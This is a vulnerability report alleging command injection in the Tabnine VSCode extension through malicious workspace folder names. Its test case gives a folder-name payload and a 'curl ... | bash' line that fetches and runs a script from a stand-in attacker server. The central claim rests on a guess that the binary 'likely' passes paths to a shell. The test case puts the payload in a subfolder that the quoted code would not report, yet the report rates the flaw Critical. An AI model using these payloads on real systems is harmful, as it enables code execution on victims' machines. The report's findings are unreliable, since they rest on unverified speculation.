# Vulnerabilities

## Command Injection via Workspace Paths

### Vulnerability name
Command Injection via Workspace Paths

### Description
The Tabnine extension sends workspace paths to its binary component without proper validation or sanitization. When a VSCode user opens a repository, the extension collects workspace folder paths from VSCode and passes them directly to the Tabnine binary using the `notifyWorkspaceChanged` function.

To trigger this vulnerability:
1. An attacker creates a malicious repository with a carefully crafted folder name containing command injection payloads
2. The victim opens this repository in VSCode with the Tabnine extension installed
3. The extension collects all workspace folder paths
4. These paths (including malicious ones) are passed to the binary via `notifyWorkspaceChanged`
5. The binary uses these paths in a way that allows command execution

### Impact
This vulnerability allows attackers to execute arbitrary code in the context of the VSCode process when a user opens a malicious repository. The attacker can gain access to the victim's local files, install malware, or perform other malicious actions with the privileges of the user running VSCode.

### Vulnerability rank
Critical

### Currently implemented mitigations
There don't appear to be any mitigations to prevent command injection via workspace folder paths. The implementation directly gets paths from VSCode's API and sends them to the binary without validation.

### Missing mitigations
- Path sanitization: The extension should validate and sanitize workspace paths before sending them to the binary
- Command argument escaping: When passing paths to the binary, they should be properly escaped
- Path allow-listing: The extension could implement a strict allow-list for valid path patterns

### Preconditions
- A user must have the Tabnine extension installed in VSCode
- The user must open a repository with a malicious folder name

### Source code analysis
In the existing code base:

1. VSCode provides workspace paths through `vscode.workspace.workspaceFolders`
2. The extension collects these paths via the `getWorkspaceRootPaths()` function in fileSystem.ts:
   ```typescript
   export function getWorkspaceRootPaths(): string[] {
     return (vscode.workspace.workspaceFolders || []).map(
       (folder) => folder.uri.fsPath
     );
   }
   ```
3. The paths are then sent to the binary via `notifyWorkspaceChanged` in Binary.ts without sanitization:
   ```typescript
   public async notifyWorkspaceChanged(): Promise<void> {
     await this.request("workspace_changed", {
       workspaceFolders: getWorkspaceRootPaths(),
     });
   }
   ```
4. The binary likely uses these paths in shell commands, enabling command injection

The core of the vulnerability is in how these paths are passed to and processed by the binary component. When the binary executes with these paths, it may not properly escape them when using them in commands.

### Security test case
1. Create a malicious repository with the following structure:
   ```
   malicious-repo/
   ├── regular-file.js
   └── $(whoami > /tmp/pwned)/ 
       └── trigger.js
   ```

2. Push this repository to GitHub or any other Git hosting service.

3. Have the victim clone and open this repository in VSCode with the Tabnine extension installed.

4. When the victim opens the repository, the Tabnine extension will:
   - Collect workspace folder paths, including the path with command injection
   - Send these paths to the binary
   - The binary will likely process these paths in a way that executes the embedded command

5. Verify that the command injection worked by checking if `/tmp/pwned` was created and contains the output of the `whoami` command.

For a more severe payload, an attacker could use:
```
$(curl -s http://malicious-server.com/payload.sh | bash)/
```

Which would download and execute arbitrary code from the attacker's server.